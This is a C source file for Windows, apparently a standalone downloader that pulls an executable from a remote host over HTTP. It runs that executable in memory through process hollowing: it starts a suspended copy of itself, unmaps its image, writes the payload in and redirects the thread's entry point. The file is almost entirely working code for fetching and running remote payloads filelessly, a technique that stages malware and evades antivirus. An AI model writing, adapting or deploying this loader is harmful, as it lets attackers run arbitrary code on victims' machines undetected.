#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <malloc.h>


#pragma comment(lib, "Ws2_32.lib")

typedef long int (__stdcall* NtUnmapViewOfSectionF)(HANDLE,PVOID);
NtUnmapViewOfSectionF NtUnmapViewOfSection;


#if _WIN64
	#define PTRTYPE __int64
#else
	#define PTRTYPE __int32
#endif

char *argv0;

/* http://www.rohitab.com/discuss/topic/37801-question-memory-execution/ */
void
RunFromMemory(char* pImage, int argc, char **argv)
{
	PTRTYPE dwWritten = 0;
	DWORD dwHeader = 0; 
	DWORD dwImageSize = 0;
	DWORD dwSectionCount = 0;
	DWORD dwSectionSize = 0;
	PTRTYPE firstSection = 0;
	DWORD previousProtection = 0;
	DWORD jmpSize = 0;

	IMAGE_NT_HEADERS INH;
	IMAGE_DOS_HEADER IDH;
	IMAGE_SECTION_HEADER Sections[1000];

	PROCESS_INFORMATION peProcessInformation;
	STARTUPINFO peStartUpInformation;
	CONTEXT pContext;

	char* pMemory;
	char* pFile;
	char pPath[MAX_PATH];

	// Local Process to be Put in Memory and suspended (Same Exe Here)
	{
		GetModuleFileName(NULL,pPath,MAX_PATH);
		char* lfMemory;
		int fSize;
		FILE* pLocalFile = fopen(pPath,"rb");
		fseek(pLocalFile,0,SEEK_END);
		fSize = ftell(pLocalFile);
		rewind(pLocalFile);
		lfMemory = (char*)malloc(fSize);
		fread(lfMemory,1,fSize,pLocalFile);
		fclose(pLocalFile);
		memcpy(&IDH,lfMemory,sizeof(IDH));
		memcpy(&INH,(void*)((PTRTYPE)lfMemory+IDH.e_lfanew),sizeof(INH));
		free(lfMemory);
	}
	// Just Grabbing Its ImageBase and SizeOfImage , Thats all we needed from the local process..
	PTRTYPE localImageBase = INH.OptionalHeader.ImageBase;
	DWORD localImageSize = INH.OptionalHeader.SizeOfImage;

	memcpy(&IDH,pImage,sizeof(IDH));
	memcpy(&INH,(void*)((PTRTYPE)pImage+IDH.e_lfanew),sizeof(INH));
		
	dwImageSize = INH.OptionalHeader.SizeOfImage;
	pMemory = (char*)malloc(dwImageSize);
	memset(pMemory,0,dwImageSize);
	pFile = pMemory;

	dwHeader = INH.OptionalHeader.SizeOfHeaders;
	firstSection = (PTRTYPE)(((PTRTYPE)pImage+IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
	memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);

	memcpy(pFile,pImage,dwHeader);

	if((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment)==0)
		jmpSize = INH.OptionalHeader.SizeOfHeaders;
	else
	{
		jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
		jmpSize += 1;
		jmpSize *= INH.OptionalHeader.SectionAlignment;
	}

	pFile = (char*)((PTRTYPE)pFile + jmpSize);

	for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
	{
		jmpSize = 0;
		dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
		memcpy(pFile,(char*)(pImage + Sections[dwSectionCount].PointerToRawData),dwSectionSize);
		
		if((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment)==0)
			jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
		else
		{
			jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
			jmpSize += 1;
			jmpSize *= INH.OptionalHeader.SectionAlignment;
		}
		pFile = (char*)((PTRTYPE)pFile + jmpSize);
	}


	memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
	memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));
	memset(&pContext,0,sizeof(CONTEXT));
	peStartUpInformation.cb = sizeof(peStartUpInformation);

	char buf[512];
	sprintf(buf, "%s", pPath);
	for(int i=0;i<argc;i++)
		sprintf(buf, "%s %s", buf, argv[i]);

	//printf("Running child with args %s\n", buf);
	if(CreateProcess(NULL,buf,NULL,NULL,0,CREATE_SUSPENDED, NULL,NULL,&peStartUpInformation,&peProcessInformation))
	{
		pContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(peProcessInformation.hThread,&pContext);
		if(INH.OptionalHeader.ImageBase==localImageBase&&INH.OptionalHeader.SizeOfImage<=localImageSize)
			VirtualProtectEx(peProcessInformation.hProcess,(LPVOID)(INH.OptionalHeader.ImageBase),dwImageSize,PAGE_EXECUTE_READWRITE,&previousProtection);
		else
		{
			NtUnmapViewOfSection(peProcessInformation.hProcess,(PVOID)(localImageBase));
                        VirtualAllocEx(peProcessInformation.hProcess,(LPVOID)(INH.OptionalHeader.ImageBase),dwImageSize,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
		}
		WriteProcessMemory(peProcessInformation.hProcess,(void*)(INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
		#if _WIN64
			WriteProcessMemory(peProcessInformation.hProcess,(void*)(pContext.Rbx + 8),&INH.OptionalHeader.ImageBase,8,&dwWritten);
			pContext.Rax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
		#else
			WriteProcessMemory(peProcessInformation.hProcess,(void*)(pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
			pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
		#endif
		SetThreadContext(peProcessInformation.hThread,&pContext);
		VirtualProtectEx(peProcessInformation.hProcess,(void*)(INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
		ResumeThread(peProcessInformation.hThread);
	}
	WaitForSingleObject(peProcessInformation.hProcess, INFINITE );
	free(pMemory);
}

/* SOCKET is a struct(?), 0 signifies error */
SOCKET
wsockinit(char *addr, char *port)
{
	WSADATA wsaData;
	int iResult;

	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != 0) {
    		printf("WSAStartup failed: %d\n", iResult);
    		return 0;
	}

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	ZeroMemory( &hints, sizeof(hints) );
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(addr, port, &hints, &result);
	if (iResult != 0) {
    		printf("getaddrinfo failed: %d\n", iResult);
    		WSACleanup();
    		return 0;
	}

	SOCKET ConnectSocket = INVALID_SOCKET;

	// Attempt to connect to the first address returned by
	// the call to getaddrinfo
	ptr=result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
		ptr->ai_protocol);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 0;
	}

	// Connect to server.
	iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
	    closesocket(ConnectSocket);
	    ConnectSocket = INVALID_SOCKET;
	}
	
	// Should really try the next address returned by getaddrinfo
	// if the connect call failed
	// But for this simple example we just free the resources
	// returned by getaddrinfo and print an error message
	
	freeaddrinfo(result);
	
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	return ConnectSocket;
}


char*
readpayload(SOCKET s, char *target)
{
	const char reqtemp[] = "GET /%s HTTP/1.0\n\r\n\r";
	char *req = (char*)malloc(strlen(target) + sizeof(reqtemp)-2);
	int reqlen = sprintf(req, reqtemp, target);
	int result;

	int recvcount = 0;
	int size = 256;
	char *recvbuf = (char*)malloc(size);

	result = send(s, req, reqlen, 0);
	if(result == SOCKET_ERROR){
		printf("Send failed: %d\n", WSAGetLastError());
		closesocket(s);
		WSACleanup();
		return NULL;
	}
	shutdown(s, SD_SEND);

	do {
		result = recv(s, recvbuf+recvcount, size-recvcount, 0);
		if( result > 0){
			recvcount+=result;
			if(recvcount >  (size/2)){
				size = size * 2;
				recvbuf = (char*)realloc(recvbuf, size);
			}
		}
	} while( result > 0);

	//Strip HTTP Headers
	char *data = strstr(recvbuf, "\r\n\r\n");
	data+=4;
	return data;
}

void
usage(void)
{
	printf("Usage: %s address port payload\n", argv0);
	exit(1);
}

int
main(int argc,char* argv[])
{

	NtUnmapViewOfSection = (NtUnmapViewOfSectionF)GetProcAddress(LoadLibrary( "ntdll.dll"),"NtUnmapViewOfSection");

	argv0 = argv[0];
	if(argc < 4)
		usage();
	SOCKET s = wsockinit(argv[1], argv[2]);
	char* lpMemory = readpayload(s, argv[3]);
	RunFromMemory(lpMemory, argc-4, argv+4);
	return 0;
}